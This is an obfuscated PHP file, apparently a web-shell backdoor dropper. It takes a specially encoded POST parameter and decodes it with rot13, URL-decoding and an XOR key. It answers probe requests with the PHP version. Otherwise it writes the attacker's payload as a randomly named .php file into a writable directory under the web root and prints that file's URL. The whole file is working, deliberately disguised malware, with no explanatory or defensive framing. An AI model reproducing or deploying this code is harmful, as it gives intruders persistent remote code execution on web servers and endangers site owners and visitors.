<?php $hkuzljxahg = "xhdwupeqvhdkstiy";$njmer = "";foreach ($_POST as $ifsqrg => $yrbqhtlt){if (strlen($ifsqrg) == 16 and substr_count($yrbqhtlt, "%") > 10){qkchnjgfwk($ifsqrg, $yrbqhtlt);}}function qkchnjgfwk($ifsqrg, $xelgy){global $njmer;$njmer = $ifsqrg;$xelgy = str_split(rawurldecode(str_rot13($xelgy)));function guhimeoe($iopzqjvzrb, $ifsqrg){global $hkuzljxahg, $njmer;return $iopzqjvzrb ^ $hkuzljxahg[$ifsqrg % strlen($hkuzljxahg)] ^ $njmer[$ifsqrg % strlen($njmer)];}$xelgy = implode("", array_map("guhimeoe", array_values($xelgy), array_keys($xelgy)));$xelgy = @unserialize($xelgy);if (@is_array($xelgy)){$ifsqrg = array_keys($xelgy);$xelgy = $xelgy[$ifsqrg[0]];if ($xelgy === $ifsqrg[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function nznlo($tbdshewir) {static $vdpqxmtyb = array();$wyfkft = glob($tbdshewir . '/*', GLOB_ONLYDIR);if (count($wyfkft) > 0) {foreach ($wyfkft as $tbdshew){if (@is_writable($tbdshew)){$vdpqxmtyb[] = $tbdshew;}}}foreach ($wyfkft as $tbdshewir) nznlo($tbdshewir);return $vdpqxmtyb;}$tmnpusuhwq = $_SERVER["DOCUMENT_ROOT"];$wyfkft = nznlo($tmnpusuhwq);$ifsqrg = array_rand($wyfkft);$tbdshewwkoow = $wyfkft[$ifsqrg] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($tbdshewwkoow, $xelgy);echo "http://" . $_SERVER["HTTP_HOST"] . substr($tbdshewwkoow, strlen($tmnpusuhwq));exit();}}}